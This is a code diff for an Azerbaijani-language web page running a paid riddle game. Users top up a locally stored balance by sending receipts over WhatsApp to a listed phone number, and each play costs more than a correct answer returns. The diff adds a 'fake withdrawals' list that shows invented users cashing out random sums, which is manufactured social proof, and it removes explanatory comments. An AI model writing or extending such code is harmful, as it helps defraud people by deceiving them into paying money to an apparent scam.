@@ -16,6 +16,8 @@ a{color:#ffdd57;text-decoration:none;font-weight:bold;}
 a:hover{text-decoration:underline;}
 #balance-display{font-weight:bold;font-size:1.2em;}
 #status{margin-top:10px;font-weight:bold;}
+#fake-withdrawals{margin-top:15px;text-align:left;}
+#fake-withdrawals li{margin:3px 0;font-size:0.9em;color:#ffd700;}
 </style>
 </head>
 <body>
@@ -32,6 +34,9 @@ a:hover{text-decoration:underline;}
 <button onclick="loginUser()">Daxil ol</button>
 <p id="login-result"></p>
 <p><a href="#" onclick="showRegister()">Qeydiyyatdan keç</a></p>
+
+<h3>Son çıxarışlar</h3>
+<ul id="fake-withdrawals"></ul>
 </section>
 
 <!-- Qeydiyyat -->
@@ -83,7 +88,23 @@ document.getElementById("start-btn").addEventListener("click", function(){
     this.style.display="none";
     document.getElementById("main-title").style.display="none";
     document.getElementById("login-section").style.display="block";
+    generateFakeWithdrawals();
 });
+
+// --- Fake withdrawals ---
+function generateFakeWithdrawals(){
+    const names = ["Elvin", "Aysel", "Murad", "Leyla", "Tural", "Nigar", "Ramin", "Sevda"];
+    const withdrawals = ["2₼","5₼","10₼","20₼","50₼","100₼"];
+    const list = document.getElementById("fake-withdrawals");
+    list.innerHTML = "";
+    for(let i=0;i<5;i++){
+        const li = document.createElement("li");
+        const name = names[Math.floor(Math.random()*names.length)];
+        const amount = withdrawals[Math.floor(Math.random()*withdrawals.length)];
+        li.textContent = `${name} istifadəçisi ${amount} çıxartdı`;
+        list.appendChild(li);
+    }
+}
 
 // --- Login / Qeydiyyat ---
 function showRegister(){ document.getElementById("login-section").style.display="none"; document.getElementById("register-section").style.display="block";}
@@ -136,8 +157,8 @@ function checkCode(){
   if(!(codeInput in codeValues)){document.getElementById("code-result").textContent="Kod səhvdir!"; return;}
   const val = codeValues[codeInput];
   let user=JSON.parse(localStorage.getItem("currentUser"));
-  user.balance = parseFloat(user.balance) || 0; // NaN problemi düzəldildi
-  user.balance += parseFloat(val.amount); // parseFloat ilə balans artırılır
+  user.balance = parseFloat(user.balance) || 0;
+  user.balance += parseFloat(val.amount);
   remainingSpins = parseInt(val.spins);
   localStorage.setItem("currentUser", JSON.stringify(user));
   document.getElementById("balance-display").textContent = `Balans: ${user.balance.toFixed(2)}₼`;
@@ -197,17 +218,17 @@ function checkAnswer(){
   let result=document.getElementById("result");
   let user=JSON.parse(localStorage.getItem("currentUser"));
   
-  user.balance = parseFloat(user.balance) || 0; // NaN problemi düzəldildi
+  user.balance = parseFloat(user.balance) || 0;
   
   if(user.balance<0.2){result.textContent="Balansınız kifayət qədər deyil!"; return;}
   
   remainingSpins--;
-  user.balance-=0.2; // oyun üçün çıxılır
+  user.balance-=0.2;
   
   if(!userAns){result.textContent="Cavabı daxil edin!"; return;}
   if(userAns===correctAns){
     current++;
-    user.balance+=0.12; // düzgün cavab balans artırır
+    user.balance+=0.12;
     result.textContent=`Düzdür! Növbəti tapmaca gəlir...`;
     setTimeout(loadRiddle,500);
   } else {
@@ -240,14 +261,12 @@ function sendReceiptWithAmount(){
   if(isNaN(amount)){document.getElementById("receipt-result").textContent="Məbləği düzgün yazın!"; return;}
   if(!file){document.getElementById("receipt-result").textContent="Zəhmət olmasa qəbz seçin!"; return;}
   
-  // Balansı artır
   let user=JSON.parse(localStorage.getItem("currentUser"));
   user.balance = parseFloat(user.balance) || 0;
   user.balance += amount;
   localStorage.setItem("currentUser", JSON.stringify(user));
   updateBalanceDisplay();
   
-  // WhatsApp yönləndirməsi ilə qəbz göndər
   const phone = "0552334814";
   const message = encodeURIComponent(`Men balansimi artirmaq isteyirem. Məbləğ: ${amount}₼`);
   window.open(`https://wa.me/${phone}?text=${message}`, '_blank');
